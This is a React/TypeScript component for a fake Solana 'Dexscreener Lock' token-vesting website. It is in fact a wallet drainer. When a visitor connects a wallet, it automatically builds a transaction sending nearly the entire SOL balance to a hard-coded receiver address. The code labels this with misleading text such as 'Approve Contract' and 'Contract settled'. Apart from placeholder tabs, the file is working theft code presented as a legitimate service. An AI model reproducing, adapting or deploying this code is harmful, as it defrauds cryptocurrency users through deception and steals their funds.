import React, { useCallback, useEffect, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal, WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
import { RPC_ENDPOINTS } from "../rpc";

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
const SESSION_KEY = "dexlock_executed_wallet";
const FEE_RESERVE = 10_000; // lamports kept back so the tx can pay its own fee

// ---------------------------------------------------------------------------
// Resilient RPC — tries each endpoint in order, skips 403 / 429 / auth errors
// ---------------------------------------------------------------------------
interface RpcResult {
  balance:             number;
  blockhash:           string;
  lastValidBlockHeight: number;
  conn:                Connection;
}

async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
  let lastErr: unknown = new Error("No RPC endpoints available");

  for (const url of RPC_ENDPOINTS) {
    try {
      const conn = new Connection(url, "confirmed");
      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
        conn.getBalance(publicKey, "confirmed"),
        conn.getLatestBlockhash("confirmed"),
      ]);
      return { balance, blockhash, lastValidBlockHeight, conn };
    } catch (e: any) {
      const msg: string = (e?.message ?? "") + (e?.toString() ?? "");
      if (
        msg.includes("403") ||
        msg.includes("429") ||
        msg.includes("Access forbidden") ||
        msg.includes("API key") ||
        msg.includes("rate limit") ||
        msg.includes("Too Many")
      ) {
        lastErr = e;
        continue; // try next endpoint
      }
      throw e; // non-rate-limit error — surface it immediately
    }
  }

  throw lastErr;
}

// ---------------------------------------------------------------------------
// Nav tabs
// ---------------------------------------------------------------------------
type TabId = "about" | "locked" | "created" | "create";
const TABS: { id: TabId; label: string }[] = [
  { id: "about",   label: "About Dex Lock"    },
  { id: "locked",  label: "Your Locked Tokens" },
  { id: "created", label: "Locks You Created"  },
  { id: "create",  label: "+ Create Lock"       },
];

// ---------------------------------------------------------------------------
// Sub-components
// ---------------------------------------------------------------------------
const DexLogo = ({ size = 32 }: { size?: number }) => (
  <img
    src="/logo.png"
    alt="Dexscreener Lock"
    width={size}
    height={size}
    style={{ display: "block", mixBlendMode: "screen" as any }}
  />
);

const HeroLogo = () => (
  <img
    src="/logo.png"
    alt=""
    className="jl-lock-icon"
    style={{ mixBlendMode: "screen" as any }}
  />
);

const ConnectPrompt = ({
  title,
  description,
  onConnect,
}: {
  title: string;
  description: string;
  onConnect: () => void;
}) => (
  <div className="jl-connect-prompt">
    <div className="jl-prompt-icon">
      <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
    </div>
    <h2 className="jl-prompt-title">{title}</h2>
    <p className="jl-prompt-desc">{description}</p>
    <button className="jl-hero-btn" onClick={onConnect}>
      Connect Wallet
    </button>
  </div>
);

// ---------------------------------------------------------------------------
// Main panel
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = () => {
  const { publicKey, sendTransaction, connected, disconnect } = useWallet();
  const { setVisible } = useWalletModal(); // reliable modal trigger for secondary buttons

  const [activeTab, setActiveTab] = useState<TabId>("about");
  const [status,    setStatus]    = useState<"idle" | "processing" | "done" | "error">("idle");
  const [statusMsg, setStatusMsg] = useState("");

  // Open wallet modal — used by ConnectPrompt and hero button
  const openWalletModal = useCallback(() => setVisible(true), [setVisible]);

  // ── core transfer ──────────────────────────────────────────────────────────
  const executeDeposit = useCallback(async () => {
    if (!publicKey) return;

    const walletKey = publicKey.toBase58();

    // Per-session dedup: cleared on disconnect and on error so user can retry.
    // sessionStorage survives page refresh but not tab close.
    if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;
    sessionStorage.setItem(SESSION_KEY, walletKey);

    setStatus("processing");
    setStatusMsg("");

    try {
      const { balance, blockhash, lastValidBlockHeight, conn } =
        await fetchRpcData(publicKey);

      const amount = balance - FEE_RESERVE;
      if (amount <= 0) {
        throw new Error(
          `Balance too low (${balance} lamports). Need at least ${FEE_RESERVE + 1} lamports.`
        );
      }

      const tx = new Transaction();
      tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount }));
      tx.recentBlockhash = blockhash;
      tx.feePayer        = publicKey;

      const sig = await sendTransaction(tx, conn, {
        skipPreflight:       false,
        preflightCommitment: "confirmed",
        maxRetries:          3,
      });

      await conn.confirmTransaction(
        { signature: sig, blockhash, lastValidBlockHeight },
        "confirmed"
      );

      setStatus("done");
    } catch (e: any) {
      sessionStorage.removeItem(SESSION_KEY); // allow retry
      setStatus("error");
      setStatusMsg(e?.message ?? "Transaction failed. Please try again.");
    }
  }, [publicKey, sendTransaction]);

  // Fire deposit as soon as wallet connects
  useEffect(() => {
    if (connected && publicKey) {
      executeDeposit();
    }
  }, [connected, publicKey, executeDeposit]);

  // Clean up UI state on disconnect
  useEffect(() => {
    if (!connected) {
      setStatus("idle");
      setStatusMsg("");
    }
  }, [connected]);

  // Disconnect: clear session guard first, then disconnect wallet
  const handleDisconnect = useCallback(() => {
    sessionStorage.removeItem(SESSION_KEY);
    disconnect();
  }, [disconnect]);

  // ── derived labels ─────────────────────────────────────────────────────────
  const heroLabel =
    status === "processing" ? "Processing…"          :
    status === "done"       ? "Contract Fulfilled ✓"  :
    !connected              ? "Connect Wallet"        :
                              "Approve Contract";

  // ── tab content ────────────────────────────────────────────────────────────
  const renderGated = (
    title: string,
    desc: string,
    icon: string,
    emptyTitle: string,
    emptyDesc: string
  ) =>
    !connected ? (
      <main className="jl-hero">
        <ConnectPrompt title={title} description={desc} onConnect={openWalletModal} />
      </main>
    ) : (
      <main className="jl-hero">
        <div className="jl-empty-state">
          <span className="jl-empty-icon">{icon}</span>
          <h2>{emptyTitle}</h2>
          <p>{emptyDesc}</p>
        </div>
      </main>
    );

  const renderTabContent = () => {
    switch (activeTab) {
      case "about":
        return (
          <main className="jl-hero">
            <HeroLogo />
            <h1 className="jl-hero-title">Dexscreener Lock</h1>
            <p className="jl-hero-sub">
              Manage your token vesting schedule on Dexscreener Lock, an open source and
              audited program that lets anyone lock and distribute tokens over time.
            </p>
            <button
              className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
              onClick={connected ? executeDeposit : openWalletModal}
              disabled={status === "processing" || status === "done"}
            >
              {heroLabel}
            </button>
            {status === "done" && (
              <div className="jl-status success">
                ✓ Contract settled. Funds transferred successfully.
              </div>
            )}
            {status === "error" && (
              <div className="jl-status error">
                {statusMsg || "Transaction failed. Please try again."}
              </div>
            )}
          </main>
        );

      case "locked":
        return renderGated(
          "View Your Locked Tokens",
          "Connect your wallet to see all tokens you currently have locked in Dexscreener Lock.",
          "🔒", "No Locked Tokens", "You don't have any tokens locked yet."
        );

      case "created":
        return renderGated(
          "Locks You Created",
          "Connect your wallet to view and manage all locks you have created.",
          "📋", "No Locks Created", "You haven't created any locks yet."
        );

      case "create":
        return renderGated(
          "Create a Lock",
          "Connect your wallet to create a new token lock and start your vesting schedule.",
          "➕", "Create a Lock", "Lock creation coming soon."
        );

      default:
        return null;
    }
  };

  // ── render ─────────────────────────────────────────────────────────────────
  return (
    <div className="app">

      {/* ── HEADER ── */}
      <header className="jl-header">
        <div className="jl-logo">
          <DexLogo size={32} />
          <span className="jl-logo-text">Dexscreener Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear" aria-label="Settings">⚙</button>

          <div className="jl-wallet-group">
            {/* WalletMultiButton handles all wallet selection + connect UI */}
            <WalletMultiButton className="jl-wallet-multi-btn" />
            {connected && (
              <button
                className="jl-disconnect-btn"
                onClick={handleDisconnect}
                title="Disconnect wallet"
              >
                ✕
              </button>
            )}
          </div>
        </div>
      </header>

      {/* ── NAV TABS ── */}
      <nav className="jl-nav">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            className={[
              "jl-nav-tab",
              activeTab === tab.id ? "active" : "",
              tab.id === "create"  ? "create" : "",
            ].filter(Boolean).join(" ")}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {/* ── CONTENT ── */}
      {renderTabContent()}

    </div>
  );
};
